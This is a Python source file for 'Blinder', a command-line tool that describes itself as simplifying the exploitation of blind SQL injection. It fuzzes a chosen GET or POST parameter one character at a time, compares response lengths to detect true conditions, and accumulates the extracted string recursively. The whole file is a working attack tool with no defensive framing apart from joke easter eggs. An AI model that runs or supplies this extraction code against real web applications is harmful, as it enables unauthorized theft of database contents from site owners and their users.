#!/usr/bin/python3
import requests, os, sys
from termcolor import colored, cprint

standart_fuzzing_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '}', '`', '{', '|', '_', '~', 'END']
to_lower = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '}', '`', '{', '|', '_', '~', 'END']

def main():
    try:
        arg_cmd = cmd_arg_handler() 
        arg_cmd['FINAL_FUZZING_STR'] = ''
    except TypeError:
        exit(0)
        greeting()

    exploitation(arg_cmd)

def help():
    cprint('''\n\t\t\t[HELP PAGE]
Usage: python3 blinder.py -u [URL] -v [GET/URL] -p [PARAMETERS]

Flags: 

[-h] [--help]: help page.фаззин
[--url] [-u]: url to target.
[-v] [--verbs]: HTTP verb (GET, POST, PUT and etc...).
[-p] [--parameters]: parameters for the target.
[-sl] [--show_length]: show response length.
[-il] [--incorrect_length]: size of incorrect length (for the filtration).
[-ec] [--exclude_characters]: Exclude characters from the fuzzing list. Specify sequentially in a line
    By default: [',&,%]
[-hg] [--hide-greeting]: Hide greeting.
[-ta] [--to-ascii]: Convert characters to ascii code.
[-ap] [--add-percent]: Add a percent sign to the end of FUZZ.
    In this mode, other characters can be added to the end of the line. These signs may be incorrect, due to the percentage.
[-tl] [--to-lower]: Convert letters to lowercase
[--hack]: Specify the URL of the target after the --hack flag, and it will be hacked.
''')


def cmd_arg_handler():
    arg_cmd = {'url': '',
            'verb': '',
            'parameters': '',
            'SLR': False,
            'incorr_len': 0,
            'exclude_chars': '',
            'hide_greeting': False,
            'to_ascii': False,
            'add_percent': False,
            'to_lower': False,
            'help': False}
    c = 0
    for i in sys.argv:

        if i == '-u' or i == '--url': 
            c_t = c+1
            arg_cmd['url'] = sys.argv[c_t]
        if i == '-v' or i == '--verbs':
            c_t = c+1
            arg_cmd['verb'] = sys.argv[c_t]
        if i == '-p' or i == '--parameters':
            c_t = c+1
            arg_cmd['parameters'] = sys.argv[c_t]
        if i == '-sl' or i == '--show_length':
            arg_cmd['SLR'] = True
        if i == '-il' or i == '--incorrect_length':
            c_t = c+1
            if sys.argv[c_t].strip().isdigit() != True:
                cprint('[ERROR] Bad wrong length.', 'red')
                exit(0)
            arg_cmd['incorr_len'] = int(sys.argv[c_t].strip())
        if i == '-ec' or i == 'exclude_characters':
            c_t = c+1
            arg_cmd['exclude_chars'] = sys.argv[c_t].strip()
        if i == '-hg' or i == '--hide-greeting':
            arg_cmd['hide_greeting'] = True
        if i == '-ta' or i == '--to-ascii':
            arg_cmd['to_ascii'] = True
        if i == '-ap' or i == '--add-percent':
            arg_cmd['add_percent'] = True
        if i == '-tl' or i == '-to-lower':
            arg_cmd['to_lower'] = True
        if i == '-h' or i == '--help':
            arg_cmd['help'] = True
        if i == '--hack':
            c_t = c+1
            
            try:
                if sys.argv[c_t] == "https://codeby.net" or sys.argv[c_t] == "https://codeby.net/" or sys.argv[c_t] == "codeby.net":
                    cprint('[DANGER] No,no,no!!!!! I won\'t do it! KRONOS WILL FIND US!', 'red')
                elif sys.argv[c_t]:
                    cprint("[EASTER EGG] Buy the premium version (*・ω・)ﾉ", 'green')
            except IndexError:
                    cprint("[EASTER EGG] Buy the premium version (*・ω・)ﾉ", 'green')

        c += 1
    
    if arg_cmd['hide_greeting'] != True:
        greeting()
    
    if arg_cmd['help'] == True or len(sys.argv) == 1:
        help()
    
    if arg_cmd['verb'] == 'GET' and arg_cmd['parameters'] != '':
        cprint('''\n[ERROR] For a get request, parameters are passed via "?"''', 'red')
        cprint('Example: codeby.net?parameter=1', 'yellow')
        exit(0)
    if arg_cmd['url'] != '' and arg_cmd['verb'] != '':
        return arg_cmd

def greeting():
    cprint('''
██████  ██      ██ ███    ██ ██████  ███████ ██████  
██   ██ ██      ██ ████   ██ ██   ██ ██      ██   ██ 
██████  ██      ██ ██ ██  ██ ██   ██ █████   ██████  
██   ██ ██      ██ ██  ██ ██ ██   ██ ██      ██   ██ 
██████  ███████ ██ ██   ████ ██████  ███████ ██   ██

Version 0.1\n''', 'green')

    cprint('Hello!\nThis is a tool that will help you simplify the exploitation blind SQL injection', 'green')
    cprint('[INFO V0.1] This version of Blinder only supports POST and GET.\n', 'red')

def FUZZ_handler_param_and_find(arr_params, arr_value_params):
    counter = 0

    for i in arr_value_params:
        if 'FUZZ' in i:
            break
        if 'FUZZ' not in i:
            cprint('[ERROR] The word FUZZ was not found :(', 'red')
            exit(0)
        counter += 1
    param_FUZZ = arr_params[counter]

    first_str = arr_value_params[counter].split('FUZZ', 1)[0]
    second_str = arr_value_params[counter].split('FUZZ', 1)[1]
    return first_str, second_str, param_FUZZ

def exploitation(arg_cmd):
    global standart_fuzzing_list,to_lower
    if arg_cmd['verb'] == 'POST':
        counter, param_arr, value_param_arr = param_value_split(arg_cmd['parameters'], arg_cmd['verb'])
    if arg_cmd['verb'] == 'GET':
        counter, param_arr, value_param_arr = param_value_split(arg_cmd['url'], arg_cmd['verb'])
        #arg_cmd['url'] = arg_cmd['url'].split('?', 1)[0]
    first_str, second_str, param_FUZZ = FUZZ_handler_param_and_find(param_arr, value_param_arr)
    
# Preparing data for fuzzing
    data = {}

    tmp_c = 0
    for i in param_arr:
        if i == param_FUZZ:
            data[param_FUZZ] = ''
        else:
            data[i] = value_param_arr[tmp_c]
        tmp_c += 1
# Fuzzing

    change_arr = []

    if arg_cmd['incorr_len'] == 0 and arg_cmd['SLR'] == False:
        cprint('[ERROR] Specify the wrong length using the [-il] flag. ', 'red')
        exit(0)
    
    if arg_cmd['to_lower'] == True:
        standart_fuzzing_list = to_lower

    for i in standart_fuzzing_list:
        if i != "'" and i != '&' and i != '%' and (i not in arg_cmd['exclude_chars']):
            if arg_cmd['to_ascii'] == True and i != 'END':
                i = str(ord(i))

            if i == 'END' and arg_cmd['SLR'] == True:
                cprint('The end of fuzzing', 'green')
                cprint('\nChanged:', 'yellow')
                for i in change_arr:
                    cprint('\t' + i, 'red')
                exit(0)


            if arg_cmd['add_percent'] == True:
                data[param_FUZZ] = first_str + arg_cmd['FINAL_FUZZING_STR'] + i + '%' + second_str
            if arg_cmd['add_percent'] == False:
                data[param_FUZZ] = first_str + arg_cmd['FINAL_FUZZING_STR'] + i + second_str


            if arg_cmd['SLR'] == True:
                if arg_cmd['verb'] == 'POST':
                    response = requests.post(arg_cmd['url'], data=data)
                elif arg_cmd['verb'] == 'GET':
                    response = requests.get(arg_cmd['url'], params=data)
                R_len = len(response.text)

                if arg_cmd['incorr_len'] == 0:
                    arg_cmd['incorr_len'] = R_len
                if R_len != arg_cmd['incorr_len']:
                    changed = '[INFO] "FUZZ" now: [' + i + ']. Length now: [' + str(R_len) + '] <- The length has changed'
                    cprint(changed, 'red')
                    change_arr.append(changed)
                else:
                    cprint('[LOG] "FUZZ" now: [' + i + ']. Length now: [' + str(R_len) + ']', 'blue')
            
            if arg_cmd['SLR'] == False:
                if i == 'END':
                    cprint('\n[INFO] The end of fuzzing.','red')
                    cprint('[INFO] Fuzzing_str_now: [' + arg_cmd['FINAL_FUZZING_STR'] + ']','green')
                    exit(0)
                if arg_cmd['incorr_len'] != 0:
                    if arg_cmd['verb'] == 'POST':
                        response = requests.post(arg_cmd['url'], data=data)
                    elif arg_cmd['verb'] == 'GET':
                        response = requests.get(arg_cmd['url'], params=data)
                
                    R_len = len(response.text)

                    if R_len != arg_cmd['incorr_len']:
                        cprint('[INFO] "FUZZ" now: [' + i + ']. Length now: [' + str(R_len) + ']', 'yellow')
                        arg_cmd['FINAL_FUZZING_STR'] += i
                        cprint('[LOG] Fuzzin_str now: [' + arg_cmd['FINAL_FUZZING_STR'] + ']', 'green') 
                        exploitation(arg_cmd)

def param_value_split(req, verb):
    param_arr = []
    value_param_arr = []
    counter = 0
    
    if verb == 'GET' and '?' in req:
        req = req.split('?', 1)[1]

    if '&' in req:
        arr_split = req.split('&')
    
        for i in arr_split:
            param_arr.append(i.split('=',1)[0])
        
            value_param_arr.append(i.split('=', 1)[1])
        for i in param_arr:
            counter += 1
    elif '&' not in req:
        param_arr.append(req.split('=',1)[0])
        value_param_arr.append(req.split('=',1)[1])
        
        for i in param_arr:
            counter += 1

    return counter,param_arr,value_param_arr

if __name__ == "__main__":
    main()
    

